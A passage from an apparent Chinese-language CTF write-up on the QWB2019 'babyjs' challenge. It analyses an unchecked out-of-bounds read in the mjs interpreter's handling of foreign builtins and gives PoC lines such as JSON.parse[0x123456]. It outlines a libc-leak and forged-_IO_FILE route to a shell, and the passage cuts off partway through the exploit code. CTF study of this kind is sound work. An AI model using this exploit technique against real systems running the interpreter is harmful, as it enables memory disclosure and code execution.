hold a zero payload otherwise it's interpreted as an</span></span><br><span class="line"><span class="comment"> * INFINITY; for simplicity we're just not going to use that combination.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAKE_TAG(s, t) \</span></span><br><span class="line">  ((<span class="keyword">uint64_t</span>)(s) &lt;&lt; <span class="number">63</span> | (<span class="keyword">uint64_t</span>) <span class="number">0x7ff0</span> &lt;&lt; <span class="number">48</span> | (<span class="keyword">uint64_t</span>)(t) &lt;&lt; <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_OBJECT MAKE_TAG(1, 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_FOREIGN MAKE_TAG(1, 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_UNDEFINED MAKE_TAG(1, 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_BOOLEAN MAKE_TAG(1, 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_NAN MAKE_TAG(1, 5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_STRING_I MAKE_TAG(1, 6)  <span class="comment">/* Inlined string len &lt; 5 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_STRING_5 MAKE_TAG(1, 7)  <span class="comment">/* Inlined string len 5 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_STRING_O MAKE_TAG(1, 8)  <span class="comment">/* Owned string */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_STRING_F MAKE_TAG(1, 9)  <span class="comment">/* Foreign string */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_STRING_C MAKE_TAG(1, 10) <span class="comment">/* String chunk */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_STRING_D MAKE_TAG(1, 11) <span class="comment">/* Dictionary string  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_ARRAY MAKE_TAG(1, 12)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_FUNCTION MAKE_TAG(1, 13)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_FUNCTION_FFI MAKE_TAG(1, 14)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_NULL MAKE_TAG(1, 15)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*'0xffff000000000000' */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_MASK MAKE_TAG(1, 15)</span></span><br></pre></td></tr></table></figure><p>这里的tag是用来区分创建的对象的，通过在地址的高16位设置flag来区分是什么类型对象，通过与或操作来将flag置位或复位。</p><h4 id="分析关键代码"><a href="#分析关键代码" class="headerlink" title="分析关键代码"></a>分析关键代码</h4><p>通过引用找到调用getprop_builtin_foreign的地方:</p><p>在解析字节码OP_GET这里调用了<code>getprop_builtin</code>，通过读源码及调试得知OP_GET是获得object某个属性值的操作.<br>obj为被load的obj，key为属性名<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> OP_GET: &#123;</span><br><span class="line">  <span class="keyword">mjs_val_t</span> obj = mjs_pop(mjs);</span><br><span class="line">  <span class="keyword">mjs_val_t</span> key = mjs_pop(mjs);</span><br><span class="line">  <span class="keyword">mjs_val_t</span> val = MJS_UNDEFINED;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!getprop_builtin(mjs, obj, key, &amp;val)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (mjs_is_object(obj)) &#123;</span><br><span class="line">      val = mjs_get_v_proto(mjs, obj, key);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, <span class="string">"type error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mjs_push(mjs, val);</span><br></pre></td></tr></table></figure></p><p><code>getprop_builtin</code>中调用了<code>getprop_builtin_foreign</code><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getprop_builtin</span><span class="params">(struct mjs *mjs, <span class="keyword">mjs_val_t</span> val, <span class="keyword">mjs_val_t</span> name,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="keyword">mjs_val_t</span> *res)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> n;</span><br><span class="line">  <span class="keyword">char</span> *s = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">int</span> need_free = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> handled = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mjs_err_t</span> err = mjs_to_string(mjs, &amp;name, &amp;s, &amp;n, &amp;need_free);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err == MJS_OK) &#123;</span><br><span class="line">    <span class="keyword">if</span> (mjs_is_string(val)) &#123;</span><br><span class="line">      handled = getprop_builtin_string(mjs, val, s, n, res);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s != <span class="literal">NULL</span> &amp;&amp; n == <span class="number">5</span> &amp;&amp; <span class="built_in">strncmp</span>(s, <span class="string">"apply"</span>, n) == <span class="number">0</span>) &#123;</span><br><span class="line">      *res = mjs_mk_foreign_func(mjs, (<span class="keyword">mjs_func_ptr_t</span>) mjs_apply_);</span><br><span class="line">      handled = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mjs_is_array(val)) &#123;</span><br><span class="line">      handled = getprop_builtin_array(mjs, val, s, n, res);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mjs_is_foreign(val)) &#123;</span><br><span class="line">      handled = getprop_builtin_foreign(mjs, val, s, n, res);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p><code>getprop_builtin</code>这里先对传入的obj做类型判断,如果是string，array，foreign类型对象中的builtin属性，则直接取其value，如果都不是则return 0，进入外层函数后调用<code>mjs_get_v_proto</code>，进行普通的load属性操作<br><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mjs<span class="number">_</span><span class="keyword">is</span><span class="number">_</span><span class="keyword">object</span>(obj)) &#123;</span><br><span class="line">  val = mjs<span class="number">_</span>get<span class="number">_</span>v<span class="number">_p</span>roto(mjs, obj, key);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  mjs<span class="number">_p</span>repend<span class="number">_</span>errorf(mjs, MJS<span class="number">_T</span>YPE<span class="number">_</span>ERROR, <span class="string">"type error"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>mjs_get_v_proto</code>的定义如下:<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mjs_val_t mjs_get_v_proto(<span class="name">struct</span> mjs *mjs, mjs_val_t obj, mjs_val_t key) &#123;</span><br><span class="line">  struct mjs_property *p<span class="comment">;</span></span><br><span class="line">  mjs_val_t pn = mjs_mk_string(<span class="name">mjs</span>, MJS_PROTO_PROP_NAME, ~<span class="number">0</span>, <span class="number">1</span>)<span class="comment">;</span></span><br><span class="line">  if ((<span class="name">p</span> = mjs_get_own_property_v(<span class="name">mjs</span>, obj, key)) != NULL) return p-&gt;value<span class="comment">;</span></span><br><span class="line">  if ((<span class="name">p</span> = mjs_get_own_property_v(<span class="name">mjs</span>, obj, pn)) == NULL) return MJS_UNDEFINED<span class="comment">;</span></span><br><span class="line">  return mjs_get_v_proto(<span class="name">mjs</span>, p-&gt;value, key)<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>遍历该obj的属性链表，如果找到了则返回其value。</p><p><code>getprop_builtin_foreign</code>函数定义如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getprop_builtin_foreign</span><span class="params">(struct mjs *mjs, <span class="keyword">mjs_val_t</span> val,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">size_t</span> name_len,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">mjs_val_t</span> *res)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> isnum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> idx = cstr_to_ulong(name, name_len, &amp;isnum);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!isnum) &#123;</span><br><span class="line">    mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, <span class="string">"index must be a number"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *ptr = (<span class="keyword">uint8_t</span> *) mjs_get_ptr(mjs, val);</span><br><span class="line">    *res = mjs_mk_number(mjs, *(ptr + idx));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将name字符串转化为整形数字，然后检查name字符串是否为数字，如果为数字则取(obj的地址+idx)位置的值为value,这里没有检查idx的范围，所以存在越界访问.</p><h4 id="builtin的实现及漏洞"><a href="#builtin的实现及漏洞" class="headerlink" title="builtin的实现及漏洞"></a>builtin的实现及漏洞</h4><p>在mjs最开始初始化时，生成了一个全局对象，<code>mjs_set</code>将这些builtin包装成属性加入这个全局对象。当使用了这些builtin的时候就会在全局对象中查找.<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mjs_set(mjs, obj, <span class="string">"load"</span>, ~<span class="number">0</span>,</span><br><span class="line">        mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_load))<span class="comment">;</span></span><br><span class="line">mjs_set(mjs, obj, <span class="string">"print"</span>, ~<span class="number">0</span>,</span><br><span class="line">        mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_print))<span class="comment">;</span></span><br><span class="line">...</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Populate JSON.parse() and JSON.stringify()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">v = mjs_mk_object(mjs)<span class="comment">;</span></span><br><span class="line">mjs_set(mjs, v, <span class="string">"stringify"</span>, ~<span class="number">0</span>,</span><br><span class="line">        mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_op_json_stringify))<span class="comment">;</span></span><br><span class="line">mjs_set(mjs, v, <span class="string">"parse"</span>, ~<span class="number">0</span>,</span><br><span class="line">        mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_op_json_parse))<span class="comment">;</span></span><br><span class="line">mjs_set(mjs, obj, <span class="string">"JSON"</span>, ~<span class="number">0</span>, v)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p><code>mjs_mk_foreign_func</code>函数的定义如下:<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mjs_val_t mjs_mk_foreign_func(<span class="class"><span class="keyword">struct</span> <span class="title">mjs</span> *<span class="title">mjs</span>, <span class="title">mjs_func_ptr_t</span> <span class="title">fn</span>) &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    mjs_func_ptr_t fn;</span><br><span class="line">    void *p;</span><br><span class="line">  &#125; u;</span><br><span class="line">  u.fn = fn;</span><br><span class="line">  (void) mjs;</span><br><span class="line">  <span class="keyword">return</span> mjs_pointer_to_value(mjs, u.p) | MJS_TAG_FOREIGN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>mjs_mk_foreign_func</code>将这些函数的类型标记为 <code>MJS_TAG_FOREIGN</code>,这里就会出现问题.<br>这样就可以对这些builtin函数当做一个js对象进行load或者store操作，例如JSON.parse[0x123456].当解释OP_GET时就会调用<code>getprop_builtin_foreign</code>来进行越界读取. 不止是JSON.parse，只要是这些builtin函数都存在这些问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print[<span class="number">0x12356</span>]</span><br></pre></td></tr></table></figure><p>这样也会造成越界读取<br><img src="/2019/09/03/QWB2019-babyjs/3.png" alt=""></p><p>来看看正常array的创建及读取操作</p><h4 id="array分析"><a href="#array分析" class="headerlink" title="array分析"></a>array分析</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>这段js代码生成的字节码如下:<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mjs_util.<span class="string">c:</span><span class="number">228</span>                  <span class="number">0</span>   BCODE_HDR   [poc.js] <span class="string">end:</span><span class="number">59</span> <span class="string">map_offset:</span> <span class="number">54</span></span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">134</span>                  <span class="number">20</span>  PUSH_STR    [a]</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">23</span>  PUSH_SCOPE</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">24</span>  CREATE  </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">134</span>                  <span class="number">25</span>  PUSH_STR    [a]</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">28</span>  FIND_SCOPE</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">29</span>  PUSH_ARRAY</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">30</span>  DUP     </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">117</span>                  <span class="number">31</span>  PUSH_INT    <span class="number">1</span></span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">33</span>  APPEND  </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">34</span>  DUP     </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">117</span>                  <span class="number">35</span>  PUSH_INT    <span class="number">2</span></span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">37</span>  APPEND  </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">38</span>  DUP     </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">117</span>                  <span class="number">39</span>  PUSH_INT    <span class="number">3</span></span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">41</span>  APPEND  </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">213</span>                  <span class="number">42</span>  EXPR        =</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">44</span>  DROP    </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">134</span>                  <span class="number">45</span>  PUSH_STR    [a]</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">48</span>  FIND_SCOPE</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">49</span>  GET     </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">117</span>                  <span class="number">50</span>  PUSH_INT    <span class="number">0</span></span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">52</span>  SWAP    </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">53</span>  GET     </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">54</span>  EXIT</span><br></pre></td></tr></table></figure></p><p>使用PUSH_ARRAY来生成一个array:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> OP_PUSH_ARRAY:</span><br><span class="line">  mjs_push(mjs, mjs_mk_array(mjs));</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p><p>mjs_mk_array函数就是先创建一个obj，然后将他标记为array<code>MJS_TAG_ARRAY</code>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mjs_val_t</span> mjs_mk_array(struct mjs *mjs) &#123;</span><br><span class="line">  <span class="keyword">mjs_val_t</span> ret = mjs_mk_object(mjs);</span><br><span class="line">  <span class="comment">/* change the tag to MJS_TAG_ARRAY */</span></span><br><span class="line">  ret &amp;= ~MJS_TAG_MASK;</span><br><span class="line">  ret |= MJS_TAG_ARRAY;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>向array添加元素使用了字节码APPEND:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> OP_APPEND: &#123;</span><br><span class="line">  <span class="keyword">mjs_val_t</span> val = mjs_pop(mjs);</span><br><span class="line">  <span class="keyword">mjs_val_t</span> arr = mjs_pop(mjs);</span><br><span class="line">  <span class="keyword">mjs_err_t</span> err = mjs_array_push(mjs, arr, val);</span><br><span class="line">  <span class="keyword">if</span> (err != MJS_OK) &#123;</span><br><span class="line">    mjs_set_errorf(mjs, MJS_TYPE_ERROR, <span class="string">"append to non-array"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里调用了mjs_array_push:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mjs_err_t</span> mjs_array_push(struct mjs *mjs, <span class="keyword">mjs_val_t</span> arr, <span class="keyword">mjs_val_t</span> v) &#123;</span><br><span class="line">  <span class="keyword">return</span> mjs_array_set(mjs, arr, mjs_array_length(mjs, arr), v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mjs_err_t</span> mjs_array_set(struct mjs *mjs, <span class="keyword">mjs_val_t</span> arr, <span class="keyword">unsigned</span> <span class="keyword">long</span> index,</span><br><span class="line">                        <span class="keyword">mjs_val_t</span> v) &#123;</span><br><span class="line">  <span class="keyword">mjs_err_t</span> ret = MJS_OK;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mjs_is_object(arr)) &#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span> n = v_sprintf_s(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"%lu"</span>, index);</span><br><span class="line">    ret = mjs_set(mjs, arr, buf, n, v);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ret = MJS_TYPE_ERROR;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>他只是生成了一个name为idx(idx是字符串类型)的属性，然后value赋值到这个属性里，这里的buf存放的即是字符串类型的idx，然后将其传入mjs_set创建属性添加到这个array中去.</p><p>以idx访问数组使用了OP_GET,会调用到mjs_get_v_proto(mjs, obj, key);以字符串形式遍历属性，不会有越界访问的问题。<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">case</span> OP_GET: &#123;</span><br><span class="line">  <span class="attribute">mjs_val_t</span> obj = mjs_pop(mjs);</span><br><span class="line">  <span class="attribute">mjs_val_t</span> key = mjs_pop(mjs);</span><br><span class="line">  <span class="attribute">mjs_val_t</span> val = MJS_UNDEFINED;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">if</span> (!getprop_builtin(mjs, obj, key, &amp;val)) &#123;</span><br><span class="line">    <span class="attribute">if</span> (mjs_is_object(obj)) &#123;</span><br><span class="line">      <span class="attribute">val</span> = mjs_get_v_proto(mjs, obj, key);</span><br></pre></td></tr></table></figure></p><h3 id="分析poc字节码"><a href="#分析poc字节码" class="headerlink" title="分析poc字节码"></a>分析poc字节码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse[<span class="number">0x123456</span>];</span><br></pre></td></tr></table></figure><p>对应的字节码如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:228</span>                  0   <span class="selector-tag">BCODE_HDR</span>   <span class="selector-attr">[poc.js]</span> <span class="selector-tag">end</span><span class="selector-pseudo">:44</span> <span class="selector-tag">map_offset</span>: 43</span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:134</span>                  20  <span class="selector-tag">PUSH_STR</span>    <span class="selector-attr">[JSON]</span></span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  26  <span class="selector-tag">FIND_SCOPE</span></span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  27  <span class="selector-tag">GET</span>     </span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:134</span>                  28  <span class="selector-tag">PUSH_STR</span>    <span class="selector-attr">[parse]</span></span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  35  <span class="selector-tag">SWAP</span>    </span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  36  <span class="selector-tag">GET</span>     </span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:117</span>                  37  <span class="selector-tag">PUSH_INT</span>    1193046</span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  41  <span class="selector-tag">SWAP</span>    </span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  42  <span class="selector-tag">GET</span></span><br></pre></td></tr></table></figure></p><p>这几步得到parse builtin(mjs_op_json_parse)地址:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:134</span>                  28  <span class="selector-tag">PUSH_STR</span>    <span class="selector-attr">[parse]</span></span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  35  <span class="selector-tag">SWAP</span>    </span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  36  <span class="selector-tag">GET</span></span><br></pre></td></tr></table></figure></p><p>然后以0x123456为index来越界访问.</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过偏移读取got表项内容，得到libc的基地址，通过读取init_array获取text基地址<br><img src="/2019/09/03/QWB2019-babyjs/4.png" alt=""><br>最终通过伪造_IO_FILE结构体来getshell，详细的操作在参考文章中有.</p><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp:"></a>完整exp:</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">offset</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a=[];</span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; <span class="number">8</span> ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i] = <span class="built_in">JSON</span>.parse[offset+i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ;i &lt; <span class="number">8</span> ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        res+=a[i]&lt;&lt;(<span 